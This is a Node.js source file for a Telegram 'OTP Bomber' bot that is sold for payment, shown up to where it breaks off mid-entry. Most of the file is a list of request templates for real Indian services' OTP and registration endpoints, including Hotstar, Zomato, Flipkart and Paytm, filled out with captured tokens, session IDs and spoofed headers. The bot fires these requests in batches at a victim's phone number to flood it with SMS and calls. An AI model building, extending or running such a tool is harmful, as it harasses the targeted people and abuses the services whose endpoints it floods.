// bot.js – Complete OTP Bomber with ALL APIs (BROADCAST + QR FIXED)
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const { BOT_TOKEN, ADMIN_IDS } = require('./config');
const db = require('./database');
const fs = require('fs');
const path = require('path');

// ===== MEMORY MANAGEMENT =====
const MEMORY_LIMIT = 400;
let lastGCTime = Date.now();

function checkMemory() {
    const now = Date.now();
    if (now - lastGCTime < 30000) return;
    lastGCTime = now;
    const used = process.memoryUsage().heapUsed / 1024 / 1024;
    if (used > MEMORY_LIMIT) {
        console.log(`⚠️ Memory high (${used.toFixed(1)}MB), running GC...`);
        if (global.gc) global.gc();
    }
}

// ===== ERROR HANDLING =====
process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('❌ Unhandled Rejection:', reason);
});

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ===== STATUS MAPS =====
const bombingStatus = new Map();
const userStates = new Map();
const pendingPayments = new Map();
const pendingScreenshots = new Map();
const adminBroadcastState = new Map();

// ===== OPTIMIZATION =====
const BATCH_SIZE = 25;
const BATCH_DELAY = 15;
const MAX_RETRIES = 2;
const API_TIMEOUT = 2500;

// ===== QR CODE PATH =====
let qrCodePath = path.join(__dirname, 'qr_code.jpg');
let qrCodeSet = false;

// ============================================================
// ===== ALL API CONFIGURATIONS =====
// ============================================================

const API_CONFIGS = [
    {
      "name": "Hotstar_1",
      "method": "PUT",
      "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
      "headers": {
        "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/json",
        "x-hs-platform": "PCTV",
        "x-country-code": "IN",
        "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
        "hotstarauth": "st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d",
        "x-hs-appversion": "5.0.40",
        "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
        "accept": "*/*",
        "origin": "https://www.hotstar.com",
        "referer": "https://www.hotstar.com/in/subscribe/sign-in",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "phone_number": "{phone}",
        "country_prefix": "91"
      },
      "phone_format": "raw"
    },
    {
      "name": "AltBalaji_1",
      "method": "POST",
      "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
      "headers": {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE",
        "Content-Type": "application/json",
        "Origin": "https://www.altbalaji.com",
        "Referer": "https://www.altbalaji.com/user-detail?pid=NTU%3D",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "phone_number": "{phone}",
        "country_code": "91",
        "platform": "web",
        "exp": 1601043289127
      },
      "phone_format": "raw"
    },
    {
      "name": "Voot_1",
      "method": "POST",
      "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
      "headers": {
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.voot.com",
        "referer": "https://www.voot.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "type": "mobile",
        "mobile": "{phone}",
        "countryCode": "+91"
      },
      "phone_format": "with_plus91"
    },
    {
      "name": "SonyLIV_1",
      "method": "POST",
      "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
      "headers": {
        "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
        "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "session_id": "cc86326a51504133bacd3ce4f796e1cf-1600956156256",
        "x-via-device": "true",
        "app_version": "3.1.20",
        "origin": "https://www.sonyliv.com",
        "referer": "https://www.sonyliv.com",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "channelPartnerID": "MSMIND",
        "mobileNumber": "{phone}",
        "country": "IN",
        "timestamp": "2020-09-24T14:03:03.505Z"
      },
      "phone_format": "raw"
    },
    {
      "name": "MedPlus",
      "method": "POST",
      "url": "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl",
      "headers": {
        "accept": "application/json, text/plain, */*",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://www.medplusmart.com",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={phone}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false"
      },
      "phone_format": "raw"
    },
    {
      "name": "Apollo247",
      "method": "POST",
      "url": "https://webapi.apollo247.com/",
      "headers": {
        "accept": "*/*",
        "Authorization": "Bearer 3d1833da7020e0602165529446587434",
        "Save-Data": "on",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/json",
        "Origin": "https://www.apollo247.com",
        "Referer": "https://www.apollo247.com/medicines?gclid=CjwKCAjwh7H7BRBBEiwAPXjadvKY3NSyNG-0yNkxp2qz2Jd5T0_zltNV3OnwoDFh3ECOsNImtyi1KxoCQY0QAvD_BwE",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "operationName": "Login",
        "variables": {
          "mobileNumber": "+91{phone}",
          "loginType": "PATIENT"
        },
        "query": "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n"
      },
      "phone_format": "with_plus91"
    },
    {
      "name": "Netmeds",
      "method": "GET",
      "url": "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
      "headers": {
        "accept": "application/json, text/plain, */*",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "referer": "https://m.netmeds.com/customer/account/login",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "phone_format": "raw"
    },
    {
      "name": "GetInstaCash",
      "method": "POST",
      "url": "https://getinstacash.in/sell/getData.php",
      "headers": {
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest",
        "Save-Data": "on",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://getinstacash.in",
        "Referer": "https://getinstacash.in/sell/login",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "type=sendOTP&mobile={phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "FBBOnline",
      "method": "POST",
      "url": "https://www.fbbonline.in/customer/account/GenerateOtp",
      "headers": {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "x-newrelic-id": "VQ8PVlFUChABV1ZRBgYCX1w=",
        "x-requested-with": "XMLHttpRequest",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.fbbonline.in",
        "referer": "https://www.fbbonline.in/customer/account/create",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp="
      },
      "phone_format": "raw"
    },
    {
      "name": "Grofers",
      "method": "POST",
      "url": "https://grofers.com/v2/accounts/",
      "headers": {
        "lon": "77.040489",
        "device_id": "a11f656b-422e-4617-953b-c350d517467d",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "auth_key": "57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13",
        "app_client": "consumer_web",
        "lat": "28.4465616",
        "content-type": "application/x-www-form-urlencoded",
        "save-data": "on",
        "accept": "*/*",
        "origin": "https://grofers.com",
        "referer": "https://grofers.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "user_phone={phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "Snapdeal",
      "method": "POST",
      "url": "https://m.snapdeal.com/signupCompleteAjax",
      "headers": {
        "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
        "h2": "true",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "u": "160081122259159083",
        "save-data": "on",
        "accept": "*/*",
        "origin": "https://m.snapdeal.com",
        "referer": "https://m.snapdeal.com/signin",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy"
      },
      "phone_format": "raw"
    },
    {
      "name": "Zomato_1",
      "method": "POST",
      "url": "https://www.zomato.com/webroutes/auth/login",
      "headers": {
        "x-zomato-csrft": "a6b0c09972b2bdd30c9c1b6552caee5d",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://www.zomato.com",
        "referer": "https://www.zomato.com/kanpur",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "country_id": 1,
        "phone": "{phone}",
        "verification_type": "sms",
        "method": "phone"
      },
      "phone_format": "raw"
    },
    {
      "name": "Cuemath_1",
      "method": "POST",
      "url": "https://www.cuemath.com/api/v4/parents/",
      "headers": {
        "Save-Data": "on",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Content-Type": "application/JSON",
        "Accept": "*/*",
        "Origin": "https://www.cuemath.com",
        "Referer": "https://www.cuemath.com/the-ultimate-cuemath-olympiad/partner/timesofindia/register/?intent=ultimate-olympiad",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "intl_mobile": {
          "phone": ""
        },
        "phone": "{phone}",
        "email": "nsbd@dn.djs",
        "full_name": "hdhdhdg",
        "place_id": "ChIJYYhT3gl3AjoRUDlkL1i5oIk",
        "timezone": "Asia/Calcutta",
        "detail_source": "CMO_2020",
        "form_fields": "full_name,phone,email,place_id"
      },
      "phone_format": "raw"
    },
    {
      "name": "Dream11_1",
      "method": "POST",
      "url": "https://www.dream11.com/graphql/mutation/pwa/register",
      "headers": {
        "accept": "*/*",
        "device": "pwa",
        "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://www.dream11.com",
        "referer": "https://www.dream11.com/register?ru=",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
        "variables": {
          "email": "tsunami@gmail.com",
          "mobileNumber": "{phone}",
          "password": "tsunami@123astronomia"
        }
      },
      "phone_format": "raw"
    },
    {
      "name": "Doubtnut",
      "method": "POST",
      "url": "https://doubtnut.com/api/v1/user/login",
      "headers": {
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "accept": "*/*",
        "origin": "https://doubtnut.com",
        "referer": "https://doubtnut.com/login",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "phone={phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "Vedantu",
      "method": "POST",
      "url": "https://user.vedantu.com/user/preLoginVerification",
      "headers": {
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://www.vedantu.com",
        "referer": "https://www.vedantu.com/masterclass?utm_source=in&utm_medium=in_ggl_cpa&utm_campaign=ggl_Brand_Search&utm_term=ggl_Brand_Search_Exact_Brand_Vedantu&utm_content=in_Brand_Search_Exact_Brand_Vedantu_Ad2&gclsrc=aw.ds&&gclid=CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "email": null,
        "phoneCode": "+91",
        "phoneNumber": "{phone}",
        "ver": "11.345"
      },
      "phone_format": "raw"
    },
    {
      "name": "Unacademy",
      "method": "POST",
      "url": "https://unacademy.com/api/v3/user/user_check/",
      "headers": {
        "accept": "*/*",
        "authorization": "Bearer undefined",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://unacademy.com",
        "referer": "https://unacademy.com/login",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "phone": "{phone}",
        "country_code": "IN",
        "otp_type": 1,
        "email": "",
        "send_otp": true,
        "is_un_teach_user": false
      },
      "phone_format": "raw"
    },
    {
      "name": "Byjus",
      "method": "POST",
      "url": "https://bcas-prod.byjusweb.com/api/send-otp",
      "headers": {
        "accept": "*/*",
        "origin": "https://byjus.com",
        "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "content-type": "application/x-www-form-urlencoded",
        "referer": "https://byjus.com/byjus-classes-book-a-free-demo-class/registration/?utm_source=google&utm_mode=CPA&utm_campaign=K12-Brand-Android-BYJU%27S-India-Apr10&utm_term=byjus&gclid=EAIaIQobChMIzKCzs5396wIVVqqWCh0TgQO4EAAYASAAEgK-V_D_BwE",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US"
      },
      "data": {
        "_raw": "phoneNumber={phone}&page=free-trial-classes"
      },
      "phone_format": "raw"
    },
    {
      "name": "RedBus_1",
      "method": "GET",
      "url": "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
      "headers": {
        "accept": "application/json, text/plain, */*",
        "save-data": "on",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "referer": "https://m.redbus.in/preregister",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "phone_format": "raw"
    },
    {
      "name": "Careers360",
      "method": "POST",
      "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
      "headers": {
        "Accept": "*/*",
        "X-CSRFToken": "9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.careers360.com",
        "Referer": "https://www.careers360.com/user/otp-verify/101e8d6e591af6688f640eee08f5a5f8?destination=&click_location=header&google_success=header",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "mobile_number={phone}&method=call&uid=12692588"
      },
      "phone_format": "raw"
    },
    {
      "name": "Coolwinks",
      "method": "GET",
      "url": "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}",
      "headers": {
        "Accept": "*/*",
        "x-user-agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36 CWUA/msite/0/",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Origin": "https://www.coolwinks.com",
        "Referer": "https://www.coolwinks.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "phone_format": "raw"
    },
    {
      "name": "Cansell",
      "method": "POST",
      "url": "https://webapi.cansell.in/api/User/SignUp",
      "headers": {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "https://m.cansell.in",
        "Referer": "https://m.cansell.in/register",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "name": "Uwusjsj",
        "surname": "wjeshs",
        "email": "hsjs@gmail.com",
        "phone": "{phone}",
        "password": "eeeeee"
      },
      "phone_format": "raw"
    },
    {
      "name": "Gaana",
      "method": "POST",
      "url": "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
      "headers": {
        "appVersion": "8.9.0",
        "CONTENT_TYPE": "application/json",
        "channel": "gaana.com",
        "tgid": "j9qcq0z2ur4llq2a58qqmag2",
        "sdkVersion": "1.0",
        "appVersionCode": "933",
        "deviceId": "j9qcq0z2ur4llq2a58qqmag2",
        "platform": "android",
        "sdkVersionCode": "1",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
      },
      "data": {
        "mobile": "91-{phone}"
      },
      "phone_format": "91-"
    },
    {
      "name": "Flipkart_1",
      "method": "POST",
      "url": "https://1.rome.api.flipkart.com/1/action/view",
      "headers": {
        "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
        "Origin": "https://www.flipkart.com",
        "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "content-type": "application/json",
        "Accept": "*/*",
        "Referer": "https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US"
      },
      "data": {
        "actionRequestContext": {
          "type": "LOGIN_IDENTITY_VERIFY",
          "loginIdPrefix": "+91",
          "loginId": "{phone}",
          "clientQueryParamMap": {
            "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135",
            "entryPage": "HOMEPAGE_HEADER_ACCOUNT"
          },
          "loginType": "MOBILE",
          "verificationType": "OTP",
          "screenName": "LOGIN_V4_MOBILE",
          "sourceContext": "DEFAULT"
        }
      },
      "phone_format": "raw"
    },
    {
      "name": "Flipkart_2",
      "method": "GET",
      "url": "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
      "headers": {
        "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "Accept": "*/*",
        "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default&ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&supportedAuthenticationTypes=password&churned=false",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US"
      },
      "phone_format": "raw"
    },
    {
      "name": "Ullu",
      "method": "POST",
      "url": "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
      "headers": {
        "accept": "application/json, text/plain, */*",
        "origin": "https://ullu.app",
        "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "referer": "https://ullu.app/",
        "accept-encoding": "gzip, deflate",
        "accept-language": "en-US"
      },
      "data": {},
      "phone_format": "raw"
    },
    {
      "name": "Paytm",
      "method": "POST",
      "url": "https://accounts.paytm.com/v2/api/register",
      "headers": {
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://accounts.paytm.com",
        "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
        "Content-Type": "application/json",
